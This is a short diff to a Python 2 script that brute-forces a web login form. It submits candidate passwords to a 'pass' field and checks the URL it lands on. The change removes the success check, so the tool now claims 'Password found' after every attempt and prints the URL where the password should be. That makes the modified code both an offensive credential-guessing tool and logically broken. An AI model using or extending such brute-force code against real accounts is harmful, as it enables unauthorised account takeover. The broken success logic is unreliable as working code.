@@ -55,10 +55,9 @@ def attack(password):
      br.form['pass'] = password
      br.submit()
      log = br.geturl()
-     if log != login:
-        print "\n\n\n [*] Password found .. !!"
-        print "\n [*] Password : %s\n" % (password)
-        sys.exit(1)
+     print "\n\n\n [*] Password found .. !!"
+     print "\n [*] Password : %s\n" % (log)
+     sys.exit(1)
   except KeyboardInterrupt:
         print "\n[*] Exiting program .. "
         sys.exit(1)
